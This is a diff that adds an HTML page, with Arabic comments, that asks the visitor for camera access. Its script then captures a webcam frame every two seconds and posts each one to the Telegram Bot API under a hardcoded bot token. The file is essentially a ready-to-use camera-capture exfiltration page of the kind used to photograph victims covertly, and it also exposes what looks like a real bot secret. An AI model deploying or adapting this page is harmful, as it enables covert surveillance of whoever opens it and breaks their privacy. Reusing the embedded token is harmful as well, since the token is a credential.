@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Automatic Photo Sender to Telegram Bot</title>
+</head>
+<body>
+
+<h2>Please allow camera access when the browser asks for permission.</h2>
+<p>Click "Allow" so the automatic photo capture can start and send photos to the Telegram bot.</p>
+
+<video id="cam" autoplay playsinline width="350"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const BOT_TOKEN = "8568730830:AAFbR4JtzNvYP8CEz1m9WWLm4tYj0DJ1eec";
+const CHAT_ID = "ضع_رقم_الشات_هنا"; // ضع Chat ID الخاص بك
+
+const video = document.getElementById("cam");
+const canvas = document.getElementById("canvas");
+
+// تشغيل الكاميرا تلقائيًا
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => video.srcObject = stream)
+.catch(err => alert("Error accessing camera: " + err.message));
+
+async function sendPhoto() {
+    const ctx = canvas.getContext("2d");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "photo.png");
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+            console.log("✔ Photo sent");
+        } catch (e) {
+            console.log("❌ Error sending photo", e);
+        }
+    });
+}
+
+// إرسال صورة كل 2 ثانية
+setInterval(sendPhoto, 2000);
+</script>
+
+</body>
+</html>
